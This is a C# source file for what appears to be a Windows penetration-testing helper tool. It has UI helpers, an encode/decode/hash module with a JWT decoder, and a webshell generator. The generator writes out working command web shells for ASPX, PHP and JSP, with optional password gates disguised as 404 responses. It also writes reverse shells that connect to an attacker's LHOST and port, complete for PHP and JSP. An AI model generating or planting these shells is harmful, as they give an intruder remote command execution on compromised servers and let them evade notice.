using System.Security.Cryptography;
using System.Text;

namespace BurpManager;

// ============================================================ shared helpers
internal static class Tk
{
    public static TextBox Mono(bool readOnly = false, bool wrap = false)
    {
        var t = new TextBox
        {
            Multiline = true,
            ScrollBars = ScrollBars.Both,
            WordWrap = wrap,
            ReadOnly = readOnly,
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Theme.Sunken,
            ForeColor = readOnly ? Theme.Muted : Theme.Text,
            Font = Theme.Code(9.5f),
        };
        Theme.InnerPad(t, 9);      // text shouldn't sit flush against the border
        SlimScroll.ForTextBox(t);  // custom scrollbar
        return t;
    }

    public static Label Cap(string t) => new()
    { Text = t, AutoSize = true, ForeColor = Theme.Muted, Font = Theme.UI };

    /// <summary>
    /// Put a mono box inside a bordered surface with real padding, so the text is inset on
    /// every side (a bare TextBox can only inset left/right).
    /// </summary>
    public static Control Inset(TextBoxBase tb, int left = 2)
    {
        tb.BorderStyle = BorderStyle.None;
        tb.Dock = DockStyle.Fill;
        var host = new Panel
        {
            Dock = DockStyle.Fill,
            BackColor = Theme.Sunken,
            // right/bottom gutters hold the custom scrollbars so they never cover the last line
            Padding = new Padding(left, 6, 14, 14),
        };
        host.Paint += (_, e) =>
        {
            using var p = new Pen(Theme.Border);
            e.Graphics.DrawRectangle(p, 0, 0, host.Width - 1, host.Height - 1);
        };
        host.Controls.Add(tb);
        return host;
    }

    /// <summary>Module title row: brand title + subtitle, grounded by a gradient underline.</summary>
    public static Control Head(string t)
    {
        var parts = t.Split(new[] { "  ·  " }, 2, StringSplitOptions.None);
        var wrap = new Panel { Dock = DockStyle.Top, Height = 40, BackColor = Theme.Bg };
        var flow = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.LeftToRight, WrapContents = false, BackColor = Theme.Bg };
        // Same line icon the nav rail uses, so title and menu entry read as one thing.
        flow.Controls.Add(new NavIcon
        {
            IconName = parts[0], Tint = Theme.Brand,
            Size = new Size(18, 18), Margin = new Padding(0, 6, 9, 0),
        });
        flow.Controls.Add(new Label { Text = parts[0], AutoSize = true, ForeColor = Theme.Brand, Font = Theme.Brandy, Margin = new Padding(0, 3, 12, 0) });
        if (parts.Length > 1)
            flow.Controls.Add(new Label { Text = "· " + parts[1], AutoSize = true, ForeColor = Theme.Muted, Font = Theme.UI, Margin = new Padding(0, 8, 0, 0) });
        wrap.Controls.Add(flow);
        // Module header line: keep the fading gradient, glow stops early (well before the line fades out).
        wrap.Controls.Add(new GradientDivider { Dock = DockStyle.Bottom, Height = 2, SweepEnd = 0.3f });
        return wrap;
    }

    /// <summary>Unified section header: neutral label on a hairline-underlined strip (one style app-wide).</summary>
    public static Control Section(string title) => Section(title, null);

    /// <summary>
    /// Section header with an optional collapse toggle on the right. The callback receives the
    /// new collapsed state; the caller decides how to give the space away.
    /// </summary>
    public static Control Section(string title, Action<bool>? onToggle)
    {
        // No rule under the title — the framed content below already reads as a boundary.
        var strip = new Panel { Dock = DockStyle.Top, Height = 24, BackColor = Theme.Bg, Padding = new Padding(0, 0, 0, 5) };

        // Label first so it docks innermost; the toggle then claims the left edge, putting the
        // caret in front of the title instead of stranded at the far right.
        strip.Controls.Add(new Label { Text = title, Dock = DockStyle.Fill, ForeColor = Theme.Muted, Font = Theme.Sans(8.5f, FontStyle.Bold), TextAlign = ContentAlignment.MiddleLeft });

        if (onToggle != null)
        {
            bool collapsed = false;
            var btn = new Button
            {
                Text = "▾", Dock = DockStyle.Left, Width = 18, FlatStyle = FlatStyle.Flat,
                BackColor = Theme.Bg, ForeColor = Theme.Muted, Font = Theme.Sans(7f),
                Cursor = Cursors.Hand, TabStop = false, Padding = new Padding(0),
            };
            btn.FlatAppearance.BorderSize = 0;
            btn.FlatAppearance.MouseOverBackColor = Theme.Hover;
            btn.Click += (_, _) =>
            {
                collapsed = !collapsed;
                btn.Text = collapsed ? "▸" : "▾";
                onToggle(collapsed);
            };
            strip.Controls.Add(btn);
        }

        return strip;
    }

    public static Button Btn(string text, int w, Action onClick, bool accent = false)
    {
        var b = new Button { Text = text, Width = w, Height = 28, Margin = new Padding(0, 0, 6, 0) };
        if (accent) Theme.AccentButton(b); else Theme.FlatButton(b);
        b.Click += (_, _) => onClick();
        return b;
    }

    public static void Copy(string s) { try { if (!string.IsNullOrEmpty(s)) Clipboard.SetText(s); } catch { } }

    /// <summary>Set text and pin the view to the first line (resizing can leave it scrolled).</summary>
    public static void SetText(TextBoxBase tb, string text)
    {
        tb.Text = text;
        ScrollTop(tb);
    }

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);

    /// <summary>
    /// Scroll a multiline box back to line 0. Uses EM_LINESCROLL rather than ScrollToCaret,
    /// which silently does nothing while the box is unfocused.
    /// </summary>
    public static void ScrollTop(TextBoxBase tb)
    {
        if (!tb.IsHandleCreated) return;
        try
        {
            int first = SendMessage(tb.Handle, 0x00CE /*EM_GETFIRSTVISIBLELINE*/, 0, 0);
            if (first != 0) SendMessage(tb.Handle, 0x00B6 /*EM_LINESCROLL*/, 0, -first);
            tb.Refresh();   // resizes during construction can leave stale pixels
        }
        catch { }
    }

    /// <summary>Normalize newlines to CRLF so multiline TextBoxes render line breaks.</summary>
    public static string Norm(string s) => s.Replace("\r\n", "\n").Replace("\r", "\n").Replace("\n", "\r\n");

    public static void SaveAs(string content, string filter, string defExt)
    {
        using var d = new SaveFileDialog { Filter = filter, DefaultExt = defExt, AddExtension = true };
        if (d.ShowDialog() == DialogResult.OK)
            try { File.WriteAllText(d.FileName, content, new UTF8Encoding(false)); } catch { }
    }
}

// ================================================================== ENCODE
internal sealed class EncodeModule : Panel
{
    private static readonly string[] Schemes =
    {
        "Base64", "Base64 URL-safe", "URL", "URL (all bytes)", "Hex", "HTML entity",
        "Unicode \\u", "MD5", "SHA-1", "SHA-256", "SHA-512", "JWT decode",
    };

    private readonly ThemeCombo _scheme = new();
    private readonly TextBox _in = Tk.Mono(wrap: true);
    private readonly TextBox _out = Tk.Mono(readOnly: true, wrap: true);
    private readonly Label _note = new();

    public EncodeModule(bool embedded = false)
    {
        BackColor = Theme.Bg;
        Padding = new Padding(12);

        var bar = new Panel { Dock = DockStyle.Top, Height = 40, BackColor = Theme.Bg };
        _scheme.Location = new Point(0, 6);
        _scheme.Width = 190;
        _scheme.AddItems(Schemes);
        _scheme.SelectedIndexChanged += (_, _) => Run(true);
        var enc = Tk.Btn("ENCODE ▸", 92, () => Run(true), accent: true); enc.Location = new Point(200, 6);
        var dec = Tk.Btn("◂ DECODE", 92, () => Run(false)); dec.Location = new Point(298, 6);
        var copy = Tk.Btn("COPY", 64, () => Tk.Copy(_out.Text)); copy.Location = new Point(396, 6);
        var clr = Tk.Btn("CLEAR", 64, () => { _in.Clear(); _out.Clear(); }); clr.Location = new Point(464, 6);
        _note.AutoSize = true; _note.ForeColor = Theme.Muted; _note.Font = Theme.Code(8.5f); _note.Location = new Point(536, 13);
        bar.Controls.AddRange(new Control[] { _scheme, enc, dec, copy, clr, _note });

        var split = new DarkSplit
        {
            Dock = DockStyle.Fill, Orientation = Orientation.Horizontal,
            BackColor = Theme.Bg, SplitterWidth = 8,
        };
        split.Panel1.BackColor = Theme.Bg; split.Panel2.BackColor = Theme.Bg;
        var inWrap = Wrap("INPUT", _in);
        var outWrap = Wrap("OUTPUT", _out);
        split.Panel1.Controls.Add(inWrap);
        split.Panel2.Controls.Add(outWrap);
        split.SplitterDistance = 300;

        _in.TextChanged += (_, _) => Run(true);

        Controls.Add(split);
        Controls.Add(bar);
        if (!embedded) Controls.Add(Tk.Head("ENCODE  ·  인코딩 / 디코딩 / 해시"));
    }

    private static Control Wrap(string title, TextBox c)
    {
        var p = new Panel { Dock = DockStyle.Fill, BackColor = Theme.Bg, Padding = new Padding(0, 4, 0, 0) };
        p.Controls.Add(Tk.Inset(c));
        p.Controls.Add(Tk.Section(title));
        return p;
    }

    private void Run(bool encode)
    {
        string s = _in.Text;
        string scheme = _scheme.SelectedItem ?? "Base64";
        _note.Text = "";
        try { _out.Text = Tk.Norm(Convert(scheme, s, encode)); }
        catch (Exception ex) { _out.Text = ""; _note.Text = "⚠ " + ex.Message; _note.ForeColor = Theme.Danger; }
        if (_note.Text.Length == 0) _note.ForeColor = Theme.Muted;
    }

    private static string Convert(string scheme, string s, bool encode)
    {
        var u8 = Encoding.UTF8;
        switch (scheme)
        {
            case "Base64":
                return encode ? System.Convert.ToBase64String(u8.GetBytes(s))
                              : u8.GetString(System.Convert.FromBase64String(s.Trim()));
            case "Base64 URL-safe":
                if (encode)
                    return System.Convert.ToBase64String(u8.GetBytes(s)).TrimEnd('=').Replace('+', '-').Replace('/', '_');
                var b = s.Trim().Replace('-', '+').Replace('_', '/');
                b = b.PadRight(b.Length + (4 - b.Length % 4) % 4, '=');
                return u8.GetString(System.Convert.FromBase64String(b));
            case "URL":
                return encode ? Uri.EscapeDataString(s) : Uri.UnescapeDataString(s);
            case "URL (all bytes)":
                if (encode)
                {
                    var sb = new StringBuilder();
                    foreach (var by in u8.GetBytes(s)) sb.Append('%').Append(by.ToString("X2"));
                    return sb.ToString();
                }
                return Uri.UnescapeDataString(s);
            case "Hex":
                if (encode)
                {
                    var sb = new StringBuilder();
                    foreach (var by in u8.GetBytes(s)) sb.Append(by.ToString("x2"));
                    return sb.ToString();
                }
                var hx = new string(s.Where(Uri.IsHexDigit).ToArray());
                var bytes = new byte[hx.Length / 2];
                for (int i = 0; i < bytes.Length; i++) bytes[i] = System.Convert.ToByte(hx.Substring(i * 2, 2), 16);
                return u8.GetString(bytes);
            case "HTML entity":
                if (encode)
                {
                    var sb = new StringBuilder();
                    foreach (var ch in s)
                        sb.Append(ch switch
                        {
                            '&' => "&amp;", '<' => "&lt;", '>' => "&gt;", '"' => "&quot;", '\'' => "&#39;",
                            _ => ch > 127 ? "&#" + (int)ch + ";" : ch.ToString(),
                        });
                    return sb.ToString();
                }
                return System.Net.WebUtility.HtmlDecode(s);
            case "Unicode \\u":
                if (encode)
                {
                    var sb = new StringBuilder();
                    foreach (var ch in s) sb.Append("\\u").Append(((int)ch).ToString("x4"));
                    return sb.ToString();
                }
                return System.Text.RegularExpressions.Regex.Replace(s, @"\\u([0-9a-fA-F]{4})",
                    m => ((char)System.Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
            case "MD5": return Hash(MD5.Create(), s, encode);
            case "SHA-1": return Hash(SHA1.Create(), s, encode);
            case "SHA-256": return Hash(SHA256.Create(), s, encode);
            case "SHA-512": return Hash(SHA512.Create(), s, encode);
            case "JWT decode":
                if (encode) return "(JWT 서명 생성은 WEB TOOLS ▸ jwt.aspx 사용 — 여기서는 decode 전용)";
                return JwtDecode(s.Trim());
            default: return s;
        }
    }

    private static string Hash(HashAlgorithm alg, string s, bool encode)
    {
        if (!encode) return "(단방향 해시 — decode 불가)";
        using (alg)
            return string.Concat(alg.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(x => x.ToString("x2")));
    }

    private static string B64UrlDecode(string p)
    {
        p = p.Replace('-', '+').Replace('_', '/');
        p = p.PadRight(p.Length + (4 - p.Length % 4) % 4, '=');
        return Encoding.UTF8.GetString(System.Convert.FromBase64String(p));
    }

    private static string JwtDecode(string jwt)
    {
        var parts = jwt.Split('.');
        if (parts.Length < 2) return "⚠ JWT 형식이 아닙니다 (header.payload.signature).";
        string Pretty(string json)
        {
            try { return System.Text.Json.JsonSerializer.Serialize(
                System.Text.Json.JsonDocument.Parse(json).RootElement,
                new System.Text.Json.JsonSerializerOptions { WriteIndented = true }); }
            catch { return json; }
        }
        var sb = new StringBuilder();
        sb.AppendLine("=== HEADER ===").AppendLine(Pretty(B64UrlDecode(parts[0]))).AppendLine();
        sb.AppendLine("=== PAYLOAD ===").AppendLine(Pretty(B64UrlDecode(parts[1])));
        if (parts.Length > 2) sb.AppendLine().AppendLine("=== SIGNATURE (b64url) ===").AppendLine(parts[2]);
        return sb.ToString();
    }
}

// ================================================================ WEBSHELL
internal sealed class WebshellModule : Panel
{
    private readonly ThemeCombo _lang = new();
    private readonly ThemeCombo _type = new();
    private readonly TextBox _param = new() { Text = "cmd" };
    private readonly TextBox _pass = new();
    private readonly TextBox _lhost = new() { Text = "10.0.0.1" };
    private readonly TextBox _lport = new() { Text = "4444" };
    private readonly TextBox _out = Tk.Mono(readOnly: true);

    public WebshellModule(bool embedded = false)
    {
        BackColor = Theme.Bg;
        Padding = new Padding(12);

        var form = new Panel { Dock = DockStyle.Top, Height = 96, BackColor = Theme.Panel, Padding = new Padding(12, 10, 12, 10) };
        Theme.StyleInput(_param); Theme.StyleInput(_pass); Theme.StyleInput(_lhost); Theme.StyleInput(_lport);
        _lang.AddItems("ASPX (.aspx)", "PHP (.php)", "JSP (.jsp)");
        _type.AddItems("Command Webshell", "Reverse Shell");

        void Field(string cap, Control c, int x, int y, int w)
        {
            var l = Tk.Cap(cap); l.Location = new Point(x, y + 3);
            c.Location = new Point(x + 66, y); c.Width = w; c.Height = 24;
            form.Controls.Add(l); form.Controls.Add(c);
        }
        Field("언어", _lang, 0, 4, 150);
        Field("유형", _type, 240, 4, 170);
        Field("param", _param, 0, 36, 150);
        Field("password", _pass, 240, 36, 170);
        Field("LHOST", _lhost, 0, 68, 150);
        Field("LPORT", _lport, 240, 68, 170);

        var barR = new FlowLayoutPanel { Dock = DockStyle.Top, Height = 40, BackColor = Theme.Bg, Padding = new Padding(0, 6, 0, 0) };
        barR.Controls.Add(Tk.Btn("GENERATE", 110, Generate, accent: true));
        barR.Controls.Add(Tk.Btn("COPY", 64, () => Tk.Copy(_out.Text)));
        barR.Controls.Add(Tk.Btn("SAVE", 64, () => Tk.SaveAs(_out.Text, "All files|*.*", Ext())));

        _out.Dock = DockStyle.Fill;
        var outWrap = new Panel { Dock = DockStyle.Fill, BackColor = Theme.Bg, Padding = new Padding(0, 4, 0, 0) };
        outWrap.Controls.Add(Tk.Inset(_out));
        outWrap.Controls.Add(Tk.Section("OUTPUT"));

        _lang.SelectedIndexChanged += (_, _) => Generate();
        _type.SelectedIndexChanged += (_, _) => Generate();

        Controls.Add(outWrap);
        Controls.Add(barR);
        Controls.Add(form);
        if (!embedded) Controls.Add(Tk.Head("WEBSHELL  ·  웹셸 / 리버스 셸 생성"));
        Generate();
    }

    private string Ext() => (_lang.SelectedIndex) switch { 1 => "php", 2 => "jsp", _ => "aspx" };

    private void Generate()
    {
        string p = string.IsNullOrWhiteSpace(_param.Text) ? "cmd" : _param.Text.Trim();
        string host = _lhost.Text.Trim(); string port = _lport.Text.Trim();
        bool rev = _type.SelectedIndex == 1;
        string pw = _pass.Text.Trim();
        int lang = _lang.SelectedIndex;

        _out.Text = Tk.Norm((lang, rev) switch
        {
            (0, false) => Aspx(p, pw),
            (0, true) => AspxRev(host, port),
            (1, false) => Php(p, pw),
            (1, true) => $"<?php\n$sock=fsockopen(\"{host}\",{port});\n$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\n?>",
            (2, false) => Jsp(p, pw),
            (2, true) => JspRev(host, port),
            _ => "",
        });
    }

    private static string Guard(string pw, string ok) =>
        string.IsNullOrEmpty(pw) ? ok : $"// 접근 암호: '{pw}' (요청 파라미터 pw 로 전달)\n" + ok;

    private static string Aspx(string p, string pw)
    {
        string gate = string.IsNullOrEmpty(pw) ? "" :
            $"    if (Request[\"pw\"] != \"{pw}\") {{ Response.StatusCode = 404; return; }}\n";
        return "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n" +
               "<script runat=\"server\">\nvoid Page_Load(object s, EventArgs e) {\n" + gate +
               $"    string c = Request[\"{p}\"];\n    if (string.IsNullOrEmpty(c)) return;\n" +
               "    var psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + c) {\n" +
               "        RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true };\n" +
               "    var pr = Process.Start(psi);\n" +
               "    Response.Write(\"<pre>\" + Server.HtmlEncode(pr.StandardOutput.ReadToEnd() + pr.StandardError.ReadToEnd()) + \"</pre>\");\n" +
               "}\n</script>";
    }

    private static string AspxRev(string h, string p) =>
        "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Net.Sockets\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n" +
        "<script runat=\"server\">\nvoid Page_Load(object s, EventArgs e){\n" +
        $"  using(var cl=new TcpClient(\"{h}\",{p})){{ var st=cl.GetStream();\n" +
        "    var pr=new Process(); pr.StartInfo.FileName=\"cmd.exe\";\n" +
        "    pr.StartInfo.RedirectStandardInput=pr.StartInfo.RedirectStandardOutput=pr.StartInfo.RedirectStandardError=true;\n" +
        "    pr.StartInfo.UseShellExecute=false; pr.Start();\n" +
        "    /* pump st <-> pr streams */ }\n}\n</script>";

    private static string Php(string p, string pw)
    {
        string gate = string.IsNullOrEmpty(pw) ? "" : $"if(($_REQUEST['pw']??'')!=='{pw}'){{http_response_code(404);exit;}}\n";
        return $"<?php\n{gate}if(isset($_REQUEST['{p}'])){{ system($_REQUEST['{p}']); }}\n?>";
    }

    private static string Jsp(string p, string pw)
    {
        string gate = string.IsNullOrEmpty(pw) ? "" :
            $"  if(!\"{pw}\".equals(request.getParameter(\"pw\"))){{ response.setStatus(404); return; }}\n";
        return "<%@ page import=\"java.util.*,java.io.*\" %>\n<%\n" + gate +
               $"  String c = request.getParameter(\"{p}\");\n  if (c != null) {{\n" +
               "    Process pr = Runtime.getRuntime().exec(c);\n" +
               "    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n" +
               "    String ln; out.println(\"<pre>\");\n    while((ln=br.readLine())!=null) out.println(ln);\n    out.println(\"</pre>\");\n  }\n%>";
    }

    private static string JspRev(string h, string p) =>
        "<%@ page import=\"java.io.*,java.net.*\" %>\n<%\n" +
        $"  Socket s = new Socket(\"{h}\", {p});\n" +
        "  Process pr = new ProcessBuilder(\"/bin/sh\",\"-i\").redirectErrorStream(true).start();\n" +
        "  new Thread(()->{ try{ InputStream pi=pr.getInputStream(); OutputStream so=s.getOutputStream(); int c; while((c=pi.read())!=-1) so.write(c);}catch(Exception e){} }).start();\n" +
        "  InputStream si=s.getInputStream(); OutputStream po=pr.getOutputStream(); int c; while((c=si.read())!=-1) po.write(c);\n%>";
}
